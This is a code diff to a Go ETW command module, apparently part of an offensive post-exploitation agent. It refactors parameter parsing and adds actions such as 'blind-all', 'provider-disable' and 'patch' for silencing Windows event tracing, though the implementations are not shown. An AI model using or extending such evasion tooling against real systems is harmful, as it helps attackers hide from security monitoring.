@@ -4,8 +4,6 @@
 package commands
 
 import (
-	"encoding/json"
-
 	"fawkes/pkg/structs"
 
 	"golang.org/x/sys/windows"
@@ -61,9 +59,9 @@ const (
 // knownSecurityProviders and providerShorthands are defined in command_helpers.go
 
 func (c *EtwCommand) Execute(task structs.Task) structs.CommandResult {
-	var params etwParams
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := unmarshalParams[etwParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if params.Action == "" {
@@ -75,15 +73,27 @@ func (c *EtwCommand) Execute(task structs.Task) structs.CommandResult {
 		return etwSessions()
 	case "providers":
 		return etwProviders()
+	case "provider-list":
+		return etwProviderList()
 	case "stop":
 		return etwStop(params.SessionName)
 	case "blind":
 		return etwBlind(params.SessionName, params.Provider)
+	case "blind-all":
+		return etwBlindAll(params.Provider)
 	case "query":
 		return etwQuery(params.SessionName)
 	case "enable":
 		return etwEnable(params.SessionName, params.Provider)
+	case "provider-disable":
+		return etwProviderDisable(params.SessionName, params.Provider)
+	case "provider-enable":
+		return etwProviderEnable(params.SessionName, params.Provider)
+	case "patch":
+		return etwPatch(params.Provider)
+	case "restore":
+		return etwRestore(params.Provider)
 	default:
-		return errorf("Unknown action: %s (use sessions, providers, stop, blind, query, enable)", params.Action)
+		return errorf("Unknown action: %s (use sessions, providers, provider-list, stop, blind, blind-all, query, enable, provider-disable, provider-enable, patch, restore)", params.Action)
 	}
 }
